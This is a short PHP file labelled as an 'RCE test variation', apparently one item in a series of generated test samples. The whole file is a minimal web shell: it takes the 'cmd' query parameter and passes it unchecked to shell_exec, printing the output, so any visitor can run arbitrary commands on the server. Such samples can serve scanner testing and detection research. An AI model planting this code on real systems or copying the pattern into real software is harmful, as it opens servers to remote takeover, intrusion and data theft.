<?php
// RCE test variation #79
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>